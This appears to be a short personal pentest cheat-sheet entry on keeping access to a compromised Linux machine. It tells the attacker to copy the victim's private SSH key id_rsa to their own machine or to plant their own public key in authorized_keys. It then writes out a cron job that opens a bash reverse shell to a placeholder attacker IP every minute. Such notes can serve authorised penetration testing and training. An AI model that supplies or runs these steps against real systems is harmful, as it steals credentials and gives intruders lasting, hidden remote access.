## Persistence via SSH Keys
- Acces the machine
- Go to `~/.ssh`
- Copy the private key `id_rsa` to attackers machine (you can use #tools/utility/scp)
- Also you can create your own key pair and paste the public key to `~/.ssh/authorized_keys` on the target machine

## Persitence via CRON Jobs
- Create a cron job to reach out to you all the time
	```
	echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attackers_ip>/1234 0>&1'" > cron
	``` 
- Add this to the cronjob
	```
	crontab -i cron
	```
